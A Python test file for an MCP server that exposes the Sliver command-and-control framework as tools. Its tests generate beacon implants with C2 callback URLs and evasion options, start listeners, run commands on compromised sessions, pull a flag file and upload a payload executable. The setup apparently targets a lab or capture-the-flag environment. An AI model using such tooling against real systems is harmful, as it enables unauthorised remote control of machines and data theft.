#!/usr/bin/env python3
"""
Tests for Sliver C2 MCP Server
"""

import json
import subprocess
import sys
import asyncio
from pathlib import Path

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from server import SliverClient


class TestSliverClient:
    """Unit tests for SliverClient."""

    def setup_method(self):
        """Set up test fixtures."""
        self.client = SliverClient(host='localhost', port=31337)

    def test_generate_implant(self):
        """Test implant generation."""
        async def run_test():
            result = await self.client.generate_implant(
                name='test-beacon',
                os='windows',
                arch='amd64',
                format='exe',
                c2_urls=['mtls://10.10.14.32:8888']
            )
            assert result['success'] is True
            assert result['name'] == 'test-beacon'
            assert result['os'] == 'windows'
            assert 'file_path' in result

        asyncio.run(run_test())

    def test_generate_implant_with_options(self):
        """Test implant generation with custom options."""
        async def run_test():
            result = await self.client.generate_implant(
                name='custom-beacon',
                os='linux',
                arch='amd64',
                format='shellcode',
                c2_urls=['https://cdn.example.com'],
                options={
                    'beacon_interval': '30s',
                    'jitter': '50',
                    'evasion': True
                }
            )
            assert result['success'] is True
            assert result['config']['beacon_interval'] == '30s'

        asyncio.run(run_test())

    def test_list_listeners(self):
        """Test listing listeners."""
        async def run_test():
            listeners = await self.client.list_listeners()
            assert isinstance(listeners, list)

        asyncio.run(run_test())

    def test_start_listener(self):
        """Test starting a listener."""
        async def run_test():
            result = await self.client.start_listener(
                protocol='mtls',
                host='0.0.0.0',
                port=8888
            )
            assert result['success'] is True
            assert result['protocol'] == 'mtls'
            assert result['port'] == 8888

        asyncio.run(run_test())

    def test_stop_listener(self):
        """Test stopping a listener."""
        async def run_test():
            result = await self.client.stop_listener('mtls-8888')
            assert result['success'] is True
            assert result['status'] == 'stopped'

        asyncio.run(run_test())

    def test_list_sessions(self):
        """Test listing sessions."""
        async def run_test():
            sessions = await self.client.list_sessions()
            assert isinstance(sessions, list)

        asyncio.run(run_test())

    def test_session_info(self):
        """Test getting session info."""
        async def run_test():
            info = await self.client.session_info('session-abc123')
            assert info['id'] == 'session-abc123'
            assert 'hostname' in info
            assert 'os' in info

        asyncio.run(run_test())

    def test_execute_command(self):
        """Test executing a command on session."""
        async def run_test():
            result = await self.client.execute(
                session_id='session-abc123',
                command='whoami'
            )
            assert result['session_id'] == 'session-abc123'
            assert result['command'] == 'whoami'
            assert 'output' in result

        asyncio.run(run_test())

    def test_download_file(self):
        """Test file download."""
        async def run_test():
            result = await self.client.download(
                session_id='session-abc123',
                remote_path='C:\\Users\\admin\\flag.txt',
                local_path='/artifacts/flag.txt'
            )
            assert result['session_id'] == 'session-abc123'
            assert 'sha256' in result

        asyncio.run(run_test())

    def test_upload_file(self):
        """Test file upload."""
        async def run_test():
            result = await self.client.upload(
                session_id='session-abc123',
                local_path='/artifacts/payload.exe',
                remote_path='C:\\Temp\\payload.exe'
            )
            assert result['session_id'] == 'session-abc123'

        asyncio.run(run_test())


def test_mcp_protocol():
    """Test MCP JSON-RPC protocol compliance."""
    server_path = Path(__file__).parent.parent / 'server.py'

    request = json.dumps({
        "jsonrpc": "2.0",
        "id": 1,
        "method": "initialize",
        "params": {}
    }) + "\n"

    proc = subprocess.Popen(
        ['python3', str(server_path)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    stdout, stderr = proc.communicate(input=request, timeout=5)

    response = json.loads(stdout.strip())
    assert response['jsonrpc'] == '2.0'
    assert response['id'] == 1
    assert response['result']['serverInfo']['name'] == 'opulence-sliver'


def test_tools_list():
    """Test tools/list returns Sliver tools."""
    server_path = Path(__file__).parent.parent / 'server.py'

    requests = [
        json.dumps({"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}}) + "\n",
        json.dumps({"jsonrpc": "2.0", "id": 2, "method": "tools/list", "params": {}}) + "\n"
    ]

    proc = subprocess.Popen(
        ['python3', str(server_path)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    stdout, stderr = proc.communicate(input=''.join(requests), timeout=5)

    lines = stdout.strip().split('\n')
    tools_response = json.loads(lines[1])

    tool_names = [t['name'] for t in tools_response['result']['tools']]
    assert 'sliver__implant_generate' in tool_names
    assert 'sliver__listeners_list' in tool_names
    assert 'sliver__sessions_list' in tool_names
    assert 'sliver__execute' in tool_names


def test_tool_call_implant_generate():
    """Test tools/call for sliver__implant_generate."""
    server_path = Path(__file__).parent.parent / 'server.py'

    requests = [
        json.dumps({"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}}) + "\n",
        json.dumps({
            "jsonrpc": "2.0",
            "id": 2,
            "method": "tools/call",
            "params": {
                "name": "sliver__implant_generate",
                "arguments": {
                    "name": "test-implant",
                    "os": "linux",
                    "arch": "amd64",
                    "format": "exe",
                    "c2_urls": ["mtls://10.10.14.32:8888"]
                }
            }
        }) + "\n"
    ]

    proc = subprocess.Popen(
        ['python3', str(server_path)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    stdout, stderr = proc.communicate(input=''.join(requests), timeout=5)

    lines = stdout.strip().split('\n')
    result = json.loads(lines[1])

    assert 'result' in result
    content = json.loads(result['result']['content'][0]['text'])
    assert content['success'] is True
    assert content['name'] == 'test-implant'


if __name__ == '__main__':
    import pytest
    pytest.main([__file__, '-v'])
